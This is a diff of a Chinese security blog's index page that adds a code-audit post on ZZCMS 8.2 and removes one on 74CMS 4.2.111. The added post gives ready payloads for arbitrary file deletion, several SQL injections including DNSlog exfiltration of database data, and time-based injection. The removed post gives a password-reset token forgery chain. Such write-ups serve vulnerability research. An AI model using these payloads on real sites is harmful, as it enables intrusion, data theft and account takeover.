@@ -236,6 +236,202 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/25/ZZCMSV8.2详细审计/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/10/25/ZZCMSV8.2详细审计/" itemprop="url">代码审计 | ZZCMSV8.2详细审计</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-25T08:15:41+08:00">
+                2018-10-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>##<strong>1.安装时配置文件可写入命令导致Getshell</strong>(需要<code>magic_qupte_gpc</code>为<code>off</code>状态)<br>一般这种重装时出现的漏洞,需要配合其他漏洞才能发挥作用(如任意文件删除<code>lock</code>文件导致重装):<br>详情可看笔者发到ichunqiu的文章:<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=44383&amp;page=1#pid500791" target="_blank" rel="noopener">ZZCMS 从任意文件删除至getshell</a></p>
+<p>##<strong>2.多处任意文件删除:</strong><br>这是ZZCMS8.2关于文件操作部分的代码:</p>
+<pre><code>A.
+if ($oldimg&lt;&gt;$img){
+        $f=&quot;../&quot;.$oldimg;
+        if (file_exists($f)){
+        unlink($f);        
+        }
+}
+
+
+B.
+if ($row[&apos;img&apos;]&lt;&gt;&quot;/image/nopic.gif&quot;){
+        $f=&quot;../&quot;.substr($row[&apos;img&apos;],1);
+        if (file_exists($f)){
+        unlink($f);
+        }
+</code></pre><p>  在前台的文件删除最多的就是这两种删除情况,A代码没有对传入的<code>$oldimg</code>进行过滤导致任意文件删除,而B是从数据库提取<code>$row[&#39;img&#39;]</code>再进行删除,经测试,在该CMS中都会造成文件删除。这里只列出漏洞文件与漏洞利用条件,因为代码无外乎上面那两段。</p>
+<p><strong>漏洞利用:</strong><br>A代码部分<br>1.<code>user\adv.php(modify与add方式都存在)</code>payload：</p>
+<pre><code>127.0.0.1:81/user/adv.php?$action=modify
+post:oldimg=install/install.lock
+</code></pre><p>2.<code>licence_save.php(随意添加一个资质,得到id为1)</code>payload：</p>
+<pre><code>http://127.0.0.1:81/user/licence_save.php?action=modify
+post：oldimg=install/install.lock&amp;id=1
+</code></pre><p>在实战中可以直接爆破得到id。<br>另外涉及的文件还有<code>user\manage.php</code>  <code>user\ppsave.php</code>  <code>user\zssave.php</code> <code>ztconfig.php</code></p>
+<p>B代码部分<br>与A的利用方式不同的是,他这里的<code>$row[&#39;img&#39;]</code>是从数据库中提取的,那我们要利用这里进行文件删除的话就需要先把脏数据(要删除的文件)写入数据库,然后再去删除。</p>
+<p>我这里也找到几处存在问题的地方：<br>1.<code>user\del.php:</code><br><img src="http://static.zybuluo.com/chhyx/mrzy5zfl10c4uulo7yitzvht/image_1cqipr8rc1tro19ucr1aql41i1p87.png" alt="image_1cqipr8rc1tro19ucr1aql41i1p87.png-99.5kB"></p>
+<p>那我们就需要找一下在哪里可以插入或者修改zzcms_main表中的img字段值的地方:<br>在<code>user\zssave.php</code>中找见:<br><img src="http://static.zybuluo.com/chhyx/p19ih7qu5a3h93k4e9zqmrp0/image_1cqipskup1f3i13hmmbp1tcc1om48k.png" alt="image_1cqipskup1f3i13hmmbp1tcc1om48k.png-57.4kB"></p>
+<p>那利用就很简单了:<br>先访问:<code>http://127.0.0.1:81/user/zssave.php</code><br>添加时将<code>$img</code>值(或<code>$flv</code>)改为想删除的文件<code>xinstall/install.lock</code>(从下标为1开始取值)<br>然后再访问:</p>
+<pre><code>http://127.0.0.1:81/user/del.php   
+post:id=1&amp;tablename=zzcms_main
+</code></pre><p>即可成功删除<code>install.lock</code>文件,这里的<code>id</code>同样需要爆破</p>
+<p>在<code>user\del.php</code>这个文件下另外一处:</p>
+<p><img src="http://static.zybuluo.com/chhyx/2br5zkprbcxioqp7w223w9h1/image_1cqip94rk1hrtkj2q7u19ud12r63d.png" alt="image_1cqip94rk1hrtkj2q7u19ud12r63d.png-69.5kB"></p>
+<p>在<code>licence_sace.php</code>有往<code>zzcms_licence</code>表写数据的操作<br><img src="http://static.zybuluo.com/chhyx/skavh97q5jwknwnxeybg8p5y/image_1cqipe3aq3iavumtf215i777g6q.png" alt="image_1cqipe3aq3iavumtf215i777g6q.png-118.8kB"><br>操作同上即可利用。</p>
+<p>##<strong>3.多处Sql注入:</strong><br><strong>A.HTTP_CLIENT_IP 注入</strong><br>获取ip的函数<code>getip()</code>无过滤,与笔者前几天分析的<a href="https://p0rz9.github.io/2018/10/21/APPCMS%E8%AF%A6%E7%BB%86%E5%AE%A1%E8%AE%A1/" target="_blank" rel="noopener">代码审计 | APPCMS详细审计</a>中的注入类似。</p>
+<pre><code>#inc\function.php    getip()
+function getip(){ 
+if (getenv(&quot;HTTP_CLIENT_IP&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_CLIENT_IP&quot;), &quot;unknown&quot;)) 
+$ip = getenv(&quot;HTTP_CLIENT_IP&quot;); 
+else if (getenv(&quot;HTTP_X_FORWARDED_FOR&quot;) &amp;&amp; strcasecmp(getenv(&quot;HTTP_X_FORWARDED_FOR&quot;), &quot;unknown&quot;)) 
+$ip = getenv(&quot;HTTP_X_FORWARDED_FOR&quot;); 
+else if (getenv(&quot;REMOTE_ADDR&quot;) &amp;&amp; strcasecmp(getenv(&quot;REMOTE_ADDR&quot;), &quot;unknown&quot;)) 
+$ip = getenv(&quot;REMOTE_ADDR&quot;); 
+else if (isset($_SERVER[&apos;REMOTE_ADDR&apos;]) &amp;&amp; $_SERVER[&apos;REMOTE_ADDR&apos;] &amp;&amp; strcasecmp($_SERVER[&apos;REMOTE_ADDR&apos;], &quot;unknown&quot;)) 
+$ip = $_SERVER[&apos;REMOTE_ADDR&apos;]; 
+else 
+$ip = &quot;unknown&quot;; 
+return ($ip); 
+} 
+</code></pre><p>然后直接搜索用到<code>getip()</code>函数的地方进行利用。</p>
+<pre><code>user\logincheck.php
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/syx67osq7fldj7gt1kzbasgk/image_1cqir6v841j0be6219ru1gheu259e.png" alt="image_1cqir6v841j0be6219ru1gheu259e.png-131.4kB"></p>
+<p>因为这里时无回显的盲注,我们用DNSlog来快速获取数据,<br>不清楚怎么使用的可参考笔者之前的文章。</p>
+<pre><code>client-ip: 1.1.1.1&apos; and ((select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxxxxx.ceye.io\\abc&apos;))))#
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/9gyfrk1tgqc2p1dac1e5hea8/image_1cqis1ttj13t7uibddvstn1kbb9r.png" alt="image_1cqis1ttj13t7uibddvstn1kbb9r.png-104.1kB"></p>
+<p>剩下的还有几处利用点,但大多类似,就不再赘述。</p>
+<p><strong>B.$tablename注入</strong><br>将传入的变量<code>$tablename</code>直接拼接到sql语句中,且无引号包裹,<br><img src="http://static.zybuluo.com/chhyx/25nmbl349o2copgl8mym97tv/image_1cqkek8v7b68ib12kb1k691kjq9.png" alt="image_1cqkek8v7b68ib12kb1k691kjq9.png-18.1kB"></p>
+<p>因为这里并无回显,所以只能利用延时注入或者dnslog带入的方式</p>
+<pre><code>http://127.0.0.1:81/user/del.php
+post:id=2&amp;tablename=zzcms_licence+where+title=100+or+if(1,sleep(2),1)--+
+</code></pre><p>与上面<code>getip()</code>类似。</p>
+<p><strong>C.stripfxg使用错误导致注入</strong><br>在该CMS中还有个危险函数<code>stripfxg()</code>,他的作用就是将已经过滤的数据还原:<br><img src="http://static.zybuluo.com/chhyx/btb1zj08yl388ipts0od8uiu/image_1cqkd93hvihq1usv1spa10ti1iuf2g.png" alt="image_1cqkd93hvihq1usv1spa10ti1iuf2g.png-51.3kB"></p>
+<p>是个危险函数无疑了。搜索调用该函数且带入数据库的地方,找到一处<code>user\msg.php</code>:<br><img src="http://static.zybuluo.com/chhyx/v42tg9owuqsbrtm39wfm3din/image_1cqkct38o1ckp1qo819809l9323.png" alt="image_1cqkct38o1ckp1qo819809l9323.png-123.8kB"></p>
+<p>这里是<code>insert</code>注入,我们可以利用多伪造一组数据的方法,<br>与<a href="https://p0rz9.github.io/2018/10/21/APPCMS%E8%AF%A6%E7%BB%86%E5%AE%A1%E8%AE%A1/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/10/21/APPCMS详细审计/</a>同理：</p>
+<pre><code>http://127.0.0.1:81/user/msg.php?action=savedata&amp;saveas=add
+POST:info_content=xxxxxxx&apos;),((select user()))#&amp;Submit=%E6%8F%90%E4%BA%A4
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/vrxf7778iix0qri6wn4mpgbv/image_1cqke5u0k1fq4l037v810pq13h13d.png" alt="image_1cqke5u0k1fq4l037v810pq13h13d.png-137.1kB"></p>
+<p>还有就是可利用延时注入:</p>
+<pre><code>http://127.0.0.1:81/user/msg.php?action=savedata&amp;saveas=add
+POST:info_content=xxxxxxx&apos;^if(1,sleep(6),0))#&amp;Submit=%E6%8F%90%E4%BA%A4
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/6p3jpkqie8rwnebvjw7veupg/image_1cqkclcimhv21lko1m8l11jtcrfm.png" alt="image_1cqkclcimhv21lko1m8l11jtcrfm.png-140.5kB"></p>
+<p>注入小技巧:</p>
+<pre><code>在碰到insert注入和update注入的时候,除了能够多伪造一组数据以外，还可以使用这种异或符号加上sleep函数来延时注入
+
+insert into user (content)VALUES(&apos;1&apos;^if(1,sleep(5),0))#
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/buipbf0dwmbusowquxf0yxmc/image_1cqkccjja1es612ksqkvs3j9pd9.png" alt="image_1cqkccjja1es612ksqkvs3j9pd9.png-10.7kB"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/23/Sqli-labs_Blind_injection_Less5-6/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2282,179 +2478,6 @@ echo $pathinfo[&apos;filename&apos;];//文件名 index
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/10/74CMS_V4.2.111任意文件读取到任意密码重置/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/10/10/74CMS_V4.2.111任意文件读取到任意密码重置/" itemprop="url">代码审计 | 74CMS_V4.2.111任意文件读取到任意密码重置</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-10T09:15:41+08:00">
-                2018-10-10
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<p>审计cms：<a href="http://static.zybuluo.com/chhyx/jnsrp4ki483xp9oi2ryenh2z/image_1cpe26mdq14po5331v8a1gik1132d.png" target="_blank" rel="noopener">74cms_v4.2.111</a><br>漏洞原理:任意文件读取得到关键Token来修改用户密码。<br>任意文件读取漏洞可参考笔者之前的文章:<a href="https://p0rz9.github.io/2018/10/09/74CMS_V4.2.111%E4%B8%80%E5%A4%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E9%99%84py%E8%84%9A%E6%9C%AC/" target="_blank" rel="noopener">74CMS_V4.2.111一处任意文件读取附py脚本</a></p>
-<p><strong>代码分析</strong><br>1.在查看<code>Home\Controller\ApiController.class.php</code>代码时:<br>发现编辑会员资料时可用<code>uid</code>修改密码<br><img src="http://static.zybuluo.com/chhyx/jnsrp4ki483xp9oi2ryenh2z/image_1cpe26mdq14po5331v8a1gik1132d.png" alt="image_1cpe26mdq14po5331v8a1gik1132d.png-60.4kB"></p>
-<p>遂拿起Burp测试一波:<br><img src="http://static.zybuluo.com/chhyx/gdusp76823b283ot2p7my7ou/image_1cpdu0m528571igq1v16eirejpp.png" alt="image_1cpdu0m528571igq1v16eirejpp.png-84.1kB"></p>
-<p>发现显示Token验证失败 我们跟进验证token的函数<code>check_token()</code>:<br><img src="http://static.zybuluo.com/chhyx/e0p6ctn3i3xh1smil7qikr9d/image_1cpduafgk1ps31irv1c5h12g9f7716.png" alt="image_1cpduafgk1ps31irv1c5h12g9f7716.png-57.2kB"></p>
-<p>我们要想通过<code>token</code>验证 需要满足这个条件:</p>
-<pre><code>(decrypt($token,C(&apos;PWDHASH&apos;))==C(&apos;PWDHASH&apos;))
-</code></pre><p>2.跟进<code>decrypt()</code>,发现这是一个解密函数,参数为源字符串与密钥:</p>
-<pre><code>function decrypt($txt, $key = &apos;_qscms&apos;) {//token  C
-// $txt 的结果为加密后的字串经过 base64 解码，然后与私有密匙一起，
-// 经过 passport_key() 函数处理后的返回值
-$txt = passport_key(base64_decode($txt), $key);
-// 变量初始化
-$tmp = &apos;&apos;;
-// for 循环，$i 为从 0 开始，到小于 $txt 字串长度的整数
-for ($i = 0; $i &lt; strlen($txt); $i++) {
-    // $tmp 字串在末尾增加一位，其内容为 $txt 的第 $i 位，
-    // 与 $txt 的第 $i + 1 位取异或。然后 $i = $i + 1
-    $tmp .= $txt[$i] ^ $txt[++$i];
-}
-// 返回 $tmp 的值作为结果
-return $tmp;
-</code></pre><p>}</p>
-<p>分析代码可得到正确的token值为<code>C(&#39;PWDHASH&#39;)</code>与密钥<code>C(&#39;PWDHASH&#39;)</code>经过<code>encrypt()</code>加密得到的字符串。</p>
-<p>我们先测试下如果拿到正确Token可不可以成功修改密码:<br><img src="http://static.zybuluo.com/chhyx/s0rm02likekl3984br8648j0/image_1cpe4ogft18r2iof1jeidqf1n7v2m.png" alt="image_1cpe4ogft18r2iof1jeidqf1n7v2m.png-89.3kB"></p>
-<p>去Burp测试:<br><img src="http://static.zybuluo.com/chhyx/a2od1lkyzvmohwm4qgqttoi3/image_1cpe4t1s01ce91irna0brlj1l2r33.png" alt="image_1cpe4t1s01ce91irna0brlj1l2r33.png-97.4kB"></p>
-<p>可看到修改成功。</p>
-<p>3.那现在的问题转化为如何去获取密钥<code>C(&#39;PWDHASH&#39;)</code><br>因为这个值是系统定义好的,那我们就可以利用昨天审出的文件读取来得到密钥,我们搜索下定义密钥的文件,得到<code>pwdhash.php</code>。</p>
-<p>4.现在利用漏洞就很简单了</p>
-<pre><code>python脚本获取含有密钥的jpg文件--&gt;PHP利用密钥进行加密,得到token--&gt;用得到的token修改用户密码
-</code></pre><p><strong>漏洞利用</strong><br>1.通过任意文件读取<br><code>upload\Application\Common\Conf\pwdhash.php</code>文件,得到一个包含pwdhash值的jpg文件</p>
-<p><img src="http://static.zybuluo.com/chhyx/e1c4hizaw7ro9iph3nht1cof/image_1cpe3saa8fdl6tkc2idmr10b529.png" alt="image_1cpe3saa8fdl6tkc2idmr10b529.png-76.1kB"></p>
-<p>2.我们本地加密得到<code>token</code>:</p>
-<pre><code>#demo.php
-&lt;?php
-
-function get_token($pwdhash){
-    $token = encrypt($pwdhash,$pwdhash);
-    var_dump($token);
-
-}
-function encrypt($txt, $key = &apos;_qscms&apos;) {
-    ...
-}
-function passport_key($txt, $encrypt_key) {
-   ...
-}
-
-$file_name = &apos;http://127.0.0.1:84/data/upload/avatar/1810/10/76162f0285d10193b1d79ceff9653d1c.jpg&apos;;
-$data = eval(str_replace(&apos;&lt;?php&apos;, &apos;&apos;, file_get_contents($file_name)));
-get_token($data[&apos;PWDHASH&apos;]);
-?&gt;
-</code></pre><p>得到Token<br><img src="http://static.zybuluo.com/chhyx/zko0432p3ubba1cbxq8e3l9z/image_1cpe1iard1uic199ju9kueb1u4h1j.png" alt="image_1cpe1iard1uic199ju9kueb1u4h1j.png-111.9kB"></p>
-<p>3.用得到的token修改密码:<br><img src="http://static.zybuluo.com/chhyx/quwblkxx885w7i2eylbn5g12/image_1cpe1lksk20k5mfq9b1u5vvre20.png" alt="image_1cpe1lksk20k5mfq9b1u5vvre20.png-103.6kB"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2505,7 +2528,7 @@ get_token($data[&apos;PWDHASH&apos;]);
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-count">34</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
